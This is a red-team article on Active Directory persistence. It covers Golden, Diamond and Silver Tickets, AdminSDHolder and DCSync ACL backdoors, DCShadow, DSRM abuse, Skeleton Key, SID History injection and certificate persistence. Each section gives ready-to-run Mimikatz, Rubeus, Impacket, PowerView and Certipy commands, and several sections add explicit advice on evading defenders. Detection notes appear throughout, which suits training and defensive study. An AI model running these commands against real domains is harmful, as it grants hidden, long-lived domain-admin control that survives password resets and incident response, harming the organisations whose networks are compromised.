# AD Persistence Deep Dive

> **MITRE ATT&CK**: Persistence > T1098 - Account Manipulation / T1558 - Steal or Forge Kerberos Tickets
> **Platforms**: Windows
> **Required Privileges**: Domain Admin / Enterprise Admin (most techniques)
> **OPSEC Risk**: Varies (Golden Ticket = High detection focus, AdminSDHolder = Often overlooked)

## Strategic Overview

Persistence in Active Directory is the final phase of domain compromise and arguably the
most operationally sensitive. A Red Team Lead must understand the full spectrum of AD
persistence mechanisms -- from well-known (Golden Tickets) to obscure (DCShadow, DSRM) --
and match the technique to the engagement's OPSEC requirements and objectives. The best
persistence is the one defenders do not know to look for.

---

## Golden Ticket

### Theory
A Golden Ticket is a forged TGT created using the KRBTGT account's hash. Since the KRBTGT
key encrypts all TGTs in the domain, possessing this hash allows forging TGTs for any user
with any group memberships, including non-existent users with Domain Admin or Enterprise Admin
privileges.

### Prerequisites
- KRBTGT NTLM hash or AES key (obtained via DCSync or NTDS.dit extraction)
- Domain SID
- Domain name

### Exploitation
```powershell
# Mimikatz - create and inject Golden Ticket
kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:NTLM_HASH /ptt

# With AES256 (stealthier - matches modern encryption)
kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /aes256:AES256_KEY /ptt

# Rubeus
.\Rubeus.exe golden /aes256:AES256_KEY /user:administrator /domain:domain.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /nowrap /ptt

# For cross-domain escalation (child to parent via ExtraSids)
kerberos::golden /user:administrator /domain:child.domain.local /sid:CHILD_SID /krbtgt:CHILD_KRBTGT /sids:S-1-5-21-PARENT_SID-519 /ptt
```
```bash
# Impacket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local administrator
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@dc01.domain.local
```

### Persistence Value
- Valid until KRBTGT password is changed **twice** (current and previous keys are valid)
- Default KRBTGT rotation: **never** (unless manually done or via security policy)
- Most environments have never rotated KRBTGT -- persistence can last years

### Detection
- **Event ID 4769**: TGS request for non-existent username or with unusual group RIDs
- **Event ID 4624**: Logon with user not in any expected group
- Encryption downgrade: RC4 ticket in AES-only environment
- Ticket lifetime anomalies: Default max is 10 hours; Golden Tickets often set 10 years
- Microsoft Defender for Identity: Golden Ticket detection based on ticket metadata

### Evasion
- Use AES256 instead of RC4 for encryption
- Set realistic ticket lifetime (match domain Kerberos policy: typically 10 hours)
- Use existing valid usernames instead of fake accounts
- Match group memberships to what the user should legitimately have
- Consider Diamond Ticket instead (see below)

---

## Diamond Ticket

### Theory
A Diamond Ticket modifies a **legitimate TGT** obtained from the KDC by decrypting it with
the KRBTGT key, modifying the PAC (adding privileged group memberships), and re-encrypting.
The ticket has legitimate KDC metadata and was genuinely issued.

### Exploitation
```powershell
# Rubeus Diamond Ticket
.\Rubeus.exe diamond /krbkey:AES256_KRBTGT_KEY /user:regular_user /password:pass /enctype:aes /ticketuser:administrator /domain:domain.local /dc:dc01.domain.local /ptt

# With specific groups
.\Rubeus.exe diamond /krbkey:AES256_KRBTGT_KEY /user:regular_user /password:pass /enctype:aes /ticketuser:administrator /domain:domain.local /dc:dc01.domain.local /groups:512,519 /ptt
```

### Why Diamond > Golden for OPSEC
| Aspect | Golden Ticket | Diamond Ticket |
|--------|--------------|----------------|
| KDC issued | No (forged entirely) | Yes (legitimate then modified) |
| AS-REQ in DC logs | No | Yes |
| Ticket metadata | Attacker-controlled | Legitimate KDC values |
| Detection difficulty | Medium (known signatures) | High (looks legitimate) |
| Non-existent user | Possible (and detectable) | Not applicable |

### Detection
- PAC inspection: Group memberships in PAC vs actual AD group membership
- Requires advanced ticket inspection (not standard logging)
- KDC referral ticket validation can sometimes detect modifications

---

## Silver Ticket

### Theory
A Silver Ticket is a forged TGS for a specific service, created with the service account's
NTLM hash. It never contacts the KDC, so no DC-side logging occurs for the ticket itself.

### Exploitation
```powershell
# CIFS access (file shares, psexec)
kerberos::golden /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:SERVICE_HASH /user:administrator /ptt

# LDAP access (DCSync via Silver Ticket)
kerberos::golden /domain:domain.local /sid:S-1-5-21-... /target:dc01.domain.local /service:ldap /rc4:DC_MACHINE_HASH /user:administrator /ptt

# HOST + RPCSS (WMI execution)
kerberos::golden /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:host /rc4:MACHINE_HASH /user:administrator /ptt
kerberos::golden /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:rpcss /rc4:MACHINE_HASH /user:administrator /ptt

# HTTP (WinRM / PowerShell Remoting)
kerberos::golden /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:http /rc4:MACHINE_HASH /user:administrator /ptt
```

### Detection
- **No Event 4769 on DC** (ticket never touches KDC) -- this is both strength and detection gap
- PAC validation (if enabled) will fail because KDC never signed this PAC
- Service-side event logs may show anomalous authentication
- Machine account password rotation (every 30 days default) invalidates Silver Tickets

---

## AdminSDHolder

### Theory
The AdminSDHolder object (CN=AdminSDHolder,CN=System,DC=domain,DC=local) has its DACL
applied to all protected groups and their members every 60 minutes by the SDProp process.
Protected groups include Domain Admins, Enterprise Admins, Schema Admins, Administrators,
Account Operators, Backup Operators, and others.

If an attacker modifies the AdminSDHolder's DACL, the added permissions propagate to every
protected group automatically. This is extremely persistent because:
- Many defenders do not monitor AdminSDHolder
- Even if a defender removes the attacker's ACL from Domain Admins, SDProp restores it within 60 min

### Exploitation
```powershell
# PowerView - Grant full control on AdminSDHolder
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -PrincipalIdentity backdoor_user -Rights All -Verbose

# More subtle: Grant only DCSync-equivalent rights
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -PrincipalIdentity backdoor_user -Rights DCSync

# After SDProp runs (within 60 min), backdoor_user has rights on all protected objects
# Force SDProp to run immediately (requires DA)
Invoke-SDPropagator -Domain domain.local

# Verify propagation
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | ?{$_.SecurityIdentifier -match "backdoor_user_SID"}
```

### Detection
- Monitor ACL changes on the AdminSDHolder object (Event ID 5136)
- Periodically audit AdminSDHolder DACL for unexpected entries
- Compare AdminSDHolder ACL against a known-good baseline

### Evasion
- Add a less obvious right (e.g., WriteDacl instead of GenericAll)
- Use a service account or computer account as the principal (less suspicious)
- Timing: Modify during legitimate change windows

---

## DCShadow

### Theory
DCShadow registers a rogue domain controller in the AD infrastructure, allowing the attacker
to push changes directly via replication. Changes made via DCShadow do not generate standard
directory change events (Event 5136) on legitimate DCs because they appear as replication data.

### Prerequisites
- Domain Admin or equivalent (SYSTEM on a DC)
- Two Mimikatz instances: one as SYSTEM (push), one as DA (register)

### Exploitation
```powershell
# Terminal 1 (run as SYSTEM on a DC or with DA rights) - register rogue DC
lsadump::dcshadow /object:target_user /attribute:description /value:"modified by dcshadow"

# Terminal 2 (run as DA) - push the changes
lsadump::dcshadow /push

# More dangerous: Add user to Domain Admins via SID History
lsadump::dcshadow /object:backdoor_user /attribute:SIDHistory /value:S-1-5-21-...-512

# Modify userAccountControl
lsadump::dcshadow /object:target_user /attribute:userAccountControl /value:66048

# Set SPN for targeted Kerberoasting (leaves no standard event trail)
lsadump::dcshadow /object:target_admin /attribute:servicePrincipalName /value:"fake/spn"
```

### Detection
- Monitor for new DC registrations (nTDSDSA objects in Configuration NC)
- Replication metadata analysis: Originating DC that is not a known DC
- Network signatures: Unusual DRS (Directory Replication Service) traffic from non-DC hosts
- Microsoft Defender for Identity: DCShadow detection

---

## DSRM (Directory Services Restore Mode)

### Theory
Every DC has a local DSRM account (the local Administrator) with a password set during
DC promotion. If `DsrmAdminLogonBehavior` is set to `2`, this account can log on to the DC
over the network -- even if all domain credentials are changed.

### Exploitation
```powershell
# Step 1: Sync DSRM password with a domain account (requires DA on DC)
ntdsutil
> set dsrm password
> sync from domain account administrator
> quit
> quit

# Step 2: Enable network logon for DSRM account
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD

# Step 3: Use DSRM credentials to authenticate to DC
# Even after domain compromise is detected and all passwords are changed,
# the DSRM password persists
sekurlsa::pth /domain:DC01 /user:Administrator /ntlm:DSRM_HASH /run:cmd.exe
```

### Detection
- Monitor registry key: `HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior`
- Event ID 4794: DSRM password change attempt
- Logon events with local (non-domain) Administrator SID on a DC

---

## Skeleton Key

### Theory
The Skeleton Key patches LSASS on a DC to accept a master password ("mimikatz" by default)
for any domain account, while the original password continues to work. This is an in-memory
patch -- it does not survive DC reboot.

### Exploitation
```powershell
# Requires DA / SYSTEM on DC
# Patch LSASS
misc::skeleton

# Now any account can authenticate with "mimikatz" as the password
# Original passwords still work -- users see no disruption
runas /user:domain\any_user cmd.exe
# Password: mimikatz

# Alternative: Use the Skeleton Key driver for persistence across reboots
misc::skeleton /dll:skeleton.dll   # Not standard, requires custom compilation
```

### Detection
- Monitor LSASS for injection (Sysmon Event 10: Process Access to lsass.exe)
- Memory integrity monitoring on DCs
- Lost on reboot -- attacker must re-apply after DC restart
- Network signature: Skeleton Key uses a specific NTLM response pattern

### Limitation
- Volatile: Lost on DC reboot
- Only works for RC4 (NTLM) authentication, not Kerberos AES
- If all DCs need to be covered, must be applied to each DC separately

---

## Security Descriptor Modification (DCSync Persistence)

### Theory
Grant an unprivileged user the `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`
rights on the domain object. This gives them permanent DCSync capability.

### Exploitation
```powershell
# PowerView - Grant DCSync rights to a backdoor user
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity backdoor_user -Rights DCSync -Verbose

# Verify
Get-DomainObjectAcl "DC=domain,DC=local" -ResolveGUIDs | ?{$_.SecurityIdentifier -match "backdoor_SID"} | select ObjectAceType, ActiveDirectoryRights

# Now backdoor_user can DCSync from any machine
lsadump::dcsync /domain:domain.local /user:krbtgt
secretsdump.py domain.local/backdoor_user:pass@dc01.domain.local -just-dc-ntlm
```

### Detection
- **Event ID 5136**: DACL modification on the domain object
- Audit who has Replication-Get-Changes rights: any non-DC, non-Azure AD Connect account is suspicious
- Periodic ACL review on the domain root object

---

## SID History Injection

### Theory
The `sIDHistory` attribute allows a user to retain access to resources from a previous domain
after migration. An attacker can inject arbitrary SIDs (such as Enterprise Admins: -519 or
Domain Admins: -512) into a regular user's SID History, granting them those privileges.

### Exploitation
```powershell
# Mimikatz - inject Domain Admin SID into a user's SID History
sid::patch
sid::add /sam:backdoor_user /new:S-1-5-21-DOMAIN_SID-512    # Domain Admins

# DSInternals approach
Stop-Service ntds -Force
Add-ADDBSidHistory -SamAccountName backdoor_user -SidHistory S-1-5-21-...-519 -DatabasePath C:\Windows\NTDS\ntds.dit
Start-Service ntds

# DCShadow approach (no service restart needed)
lsadump::dcshadow /object:backdoor_user /attribute:SIDHistory /value:S-1-5-21-...-512
```

### Persistence Value
- Survives password changes (SID History is an account attribute)
- Persists through group membership audits (user is not "in" Domain Admins)
- Blocked by SID filtering at forest trust boundaries (but NOT within the same forest)

### Detection
- Monitor `sIDHistory` attribute changes (Event ID 5136 or 4765)
- Audit all accounts with non-empty SID History
- SID History containing well-known privileged RIDs is always suspicious

---

## Certificate Persistence

### Theory
Certificates requested from ADCS can be used for PKINIT authentication. If an attacker
obtains a certificate for a privileged user, that certificate remains valid even after the
user's password is changed. Default certificate lifetimes are typically 1 year.

### Exploitation
```bash
# Request a long-lived certificate (if template allows)
certipy req -u administrator -hashes :NTLM_HASH -ca 'domain-CA' -template 'User' -dc-ip DC_IP

# The certificate is now valid for authentication regardless of password changes
certipy auth -pfx administrator.pfx -dc-ip DC_IP -username administrator -domain domain.local
# Returns current NT hash via UnPAC-the-hash

# Can be used repeatedly for the certificate's entire validity period
# Even after incident response changes all passwords
```

```powershell
# Rubeus - authenticate with certificate months later
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:pfx_password /getcredentials /nowrap
# The /getcredentials flag extracts the current NTLM hash
```

### Persistence Value
- Survives all password changes (certificate-based auth is independent)
- Valid for the certificate's lifetime (often 1 year, sometimes longer)
- Even after KRBTGT rotation (unlike Golden Tickets)
- Defenders must explicitly revoke the certificate or disable the CA

### Detection
- Track all issued certificates and their subjects (CA event logs)
- Monitor for PKINIT authentication from unexpected sources
- Certificate revocation checking must be properly configured
- Event ID 4768 with pre-auth type 16 (PKINIT) for unexpected accounts

---

## Persistence Comparison Matrix

| Technique | Survives Password Change | Survives KRBTGT Rotation | Survives Reboot | Detection Difficulty |
|-----------|-------------------------|------------------------|----------------|---------------------|
| Golden Ticket | Yes | No (if rotated 2x) | N/A (ticket-based) | Medium |
| Diamond Ticket | Yes | No (if rotated 2x) | N/A (ticket-based) | High |
| Silver Ticket | Yes | Yes | N/A (30-day machine pw) | Medium |
| AdminSDHolder | Yes | Yes | Yes | Medium-Low |
| DCShadow | Depends on change | Yes | Yes | High |
| DSRM | Yes | Yes | Yes | Medium |
| Skeleton Key | N/A | N/A | **No** | Medium |
| DCSync Rights | Yes | Yes | Yes | Low (if audited) |
| SID History | Yes | Yes | Yes | Low (if audited) |
| Certificates | Yes | Yes | Yes | Medium |

---

## Cross-References

- [AD Fundamentals](./ad-fundamentals.md) -- Kerberos mechanics behind ticket forging
- [Kerberos Attacks Deep Dive](./kerberos-attacks-deep-dive.md) -- Ticket attack details
- [ADCS Attacks](./adcs-attacks.md) -- Certificate-based persistence source
- [AD Attack Path Methodology](./ad-attack-path-methodology.md) -- Phase 5 persistence placement

---

## References

- [Sean Metcalf: AD Persistence](https://adsecurity.org/?p=1929)
- [harmj0y: AdminSDHolder](https://harmj0y.net/blog/activedirectory/abusing-active-directory-permissions-with-powerview/)
- [Vincent Le Toux: DCShadow](https://www.dcshadow.com/)
- [Will Schroeder: Diamond Tickets](https://posts.specterops.io/)
- [Elad Shamir: Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
- [SpecterOps: Certified Pre-Owned (cert persistence)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [Microsoft: DSRM Account](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc731865(v=ws.11))
